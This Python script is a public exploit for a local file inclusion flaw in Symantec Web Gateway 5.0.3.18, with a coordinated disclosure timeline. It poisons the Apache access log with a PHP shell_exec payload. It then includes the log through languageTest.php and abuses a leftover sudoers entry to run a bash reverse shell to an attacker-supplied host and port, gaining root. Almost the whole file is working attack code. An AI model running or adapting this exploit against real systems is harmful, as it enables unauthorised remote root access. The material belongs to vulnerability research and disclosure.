#!/usr/bin/python

'''

The original patch for the Symantec Web Gateway 5.0.2 LFI vulnerability removed the
/tmp/networkScript file but left the entry in /etc/sudoers, allowing us to simply
recreate the file and obtain a root shell using a different LFI vulnerability.

Timeline:

# 06 Jun 2012: Vulnerability reported to CERT
# 08 Jun 2012: Response received from CERT with disclosure date set to 20 Jul 2012
# 26 Jun 2012: Email received from Symantec for additional information
# 26 Jun 2012: Additional proofs of concept sent to Symantec
# 06 Jul 2012: Update received from Symantec with intent to fix
# 20 Jul 2012: Symantec patch released: http://www.symantec.com/security_response/securityupdates/detail.jsp?fid=security_advisory&pvid=security_advisory&year=2012&suid=20120720_00
# 23 Jul 2012: Public Disclosure

'''

import socket
import sys
import base64

print "[*] #########################################################"
print "[*] Symantec Web Gateway 5.0.3.18 LFI Remote ROOT RCE Exploit"
print "[*] Offensive Security - http://www.offensive-security.com"
print "[*] #########################################################\n"

if (len(sys.argv) != 4):
	print "[*] Usage: symantec-web-gateway-0day.py <RHOST> <LHOST> <LPORT>"
	exit(0)

rhost = str(sys.argv[1])
lhost = sys.argv[2]
lport = sys.argv[3]

# Base64 encoded bash reverse shell
# Payload does sudo-fu abuse of sudoable /tmp/networkScript with apache:apache permissions

payload= '''echo '#!/bin/bash' > /tmp/networkScript; echo 'bash -i >& /dev/tcp/'''+lhost+'/' + lport 
payload+=''' 0>&1' >> /tmp/networkScript;chmod 755 /tmp/networkScript; sudo /tmp/networkScript'''
payloadencoded=base64.encodestring(payload).replace("\n","")

taint="GET /<?php shell_exec(base64_decode('%s'));?> HTTP/1.1\r\n\r\n" % payloadencoded
trigger="GET /spywall/languageTest.php?&language=../../../../../../../../usr/local/apache2/logs/access_log%00 HTTP/1.0\r\n\r\n"

print "[*] Super Sudo Backdoor injection, w00t"
expl = socket.socket ( socket.AF_INET, socket.SOCK_STREAM )
expl.connect((rhost, 80))
expl.send(taint)
expl.close()

print "[*] Triggering Payload ...3,2,1 "
expl = socket.socket ( socket.AF_INET, socket.SOCK_STREAM )
expl.connect((rhost, 80))
expl.send(trigger)
expl.close()
print "[*] Can you haz shell on %s %s ?\n" % (lhost,lport)